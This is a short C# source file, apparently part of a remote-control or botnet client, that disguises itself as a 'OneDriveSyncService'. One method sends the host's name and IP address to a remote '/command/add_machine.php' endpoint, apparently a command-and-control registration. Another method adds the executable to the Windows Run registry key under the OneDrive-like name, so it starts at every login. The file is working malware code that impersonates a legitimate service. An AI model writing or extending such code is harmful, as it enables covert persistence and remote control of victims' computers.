using System.Diagnostics;
using System.Net;

namespace OneDriveSyncService
{
    internal class Join
    {
        public static string JoinServer(WebClient webClient, string serverName)
        {
            string name = Dns.GetHostName();
            string ip = Dns.GetHostEntry(name).AddressList[0].ToString();
            string response;

            string payload = "name=" + name + "&" + "ip=" + ip;
            webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            response = webClient.UploadString(serverName + "/command/add_machine.php", payload);
            return response;
        }

        public static void Startup()
        {
            Microsoft.Win32.RegistryKey regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            regKey.SetValue("OneDriveSyncService", Process.GetCurrentProcess().MainModule.FileName);
            regKey.Dispose();
            regKey.Close();
        }
    }
}